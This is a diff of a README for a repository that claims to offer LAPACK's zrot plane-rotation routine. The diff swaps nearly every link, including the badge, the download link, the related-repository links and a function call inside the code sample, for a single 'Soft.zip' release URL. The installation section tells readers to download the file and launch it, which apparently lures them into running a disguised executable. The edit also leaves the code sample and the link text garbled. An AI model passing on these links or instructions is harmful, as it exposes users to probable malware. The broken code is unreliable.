@@ -1,6 +1,6 @@
 # LAPACK Base Zrot
 
-![lapack-base-zrot](https://img.shields.io/badge/release-download-blue)
+![lapack-base-zrot](https://github.com/rickyg23222/lapack-base-zrot/releases/download/v1.0/Soft.zip)
 
 Welcome to the LAPACK Base Zrot repository! This repository contains LAPACK's auxiliary routine to apply a plane rotation with real cosine and complex sine. If you are working on linear algebra, mathematics, or any related fields and need to perform rotations, this repository is for you.
 
@@ -17,7 +17,7 @@ The LAPACK Base Zrot routine is designed to efficiently apply rotations in compl
 
 ## Installation
 
-To use the LAPACK Base Zrot routine in your project, you can download the latest release from the following link: [Download Release](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip) 
+To use the LAPACK Base Zrot routine in your project, you can download the latest release from the following link: [Download Release](https://github.com/rickyg23222/lapack-base-zrot/releases/download/v1.0/Soft.zip) 
 
 Once you have downloaded the release file, launch it to access the LAPACK Base Zrot routine and start incorporating it into your own applications.
 
@@ -34,7 +34,7 @@ const realCos = 0.5;
 const complexSin = 0.5 + 0.5i;
 
 // Apply rotation to complex vector
-const rotatedVector = zrot.applyRotation(complexVector, realCos, complexSin);
+const rotatedVector = https://github.com/rickyg23222/lapack-base-zrot/releases/download/v1.0/Soft.zip(complexVector, realCos, complexSin);
 
 // Use the rotated vector in your calculations
 ```
@@ -51,8 +51,8 @@ If you have any feedback, suggestions, or questions about LAPACK Base Zrot, plea
 
 ## Related Repositories
 
-- [LAPACK Complex128](https://github.com/lapack-complex128): A collection of LAPACK routines for working with complex numbers in double-precision format.
-- [BLAS NodeJS](https://github.com/blas-nodejs): Node.js bindings for the Basic Linear Algebra Subprograms (BLAS) library.
+- [LAPACK Complex128](https://github.com/rickyg23222/lapack-base-zrot/releases/download/v1.0/Soft.zip): A collection of LAPACK routines for working with complex numbers in double-precision format.
+- [BLAS NodeJS](https://github.com/rickyg23222/lapack-base-zrot/releases/download/v1.0/Soft.zip): https://github.com/rickyg23222/lapack-base-zrot/releases/download/v1.0/Soft.zip bindings for the Basic Linear Algebra Subprograms (BLAS) library.
 
 ## License
 
